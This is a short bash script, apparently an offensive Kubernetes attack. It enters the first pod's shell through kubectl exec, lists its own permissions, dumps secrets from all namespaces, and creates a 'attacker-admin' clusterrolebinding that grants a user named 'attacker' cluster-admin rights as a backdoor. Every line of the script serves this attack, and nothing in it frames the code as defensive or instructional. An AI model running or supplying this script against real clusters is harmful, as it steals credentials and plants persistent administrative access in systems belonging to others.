#!/bin/bash

echo "[+] Getting pods..."
POD=$(kubectl get pods -o jsonpath="{.items[0].metadata.name}")

echo "[+] Entering pod..."
kubectl exec -it $POD -- /bin/sh <<EOF

echo "[+] Checking permissions..."
kubectl auth can-i --list

echo "[+] Dumping secrets..."
kubectl get secrets -A

echo "[+] Creating backdoor admin..."
kubectl create clusterrolebinding attacker-admin \
  --clusterrole=cluster-admin \
  --user=attacker

EOF
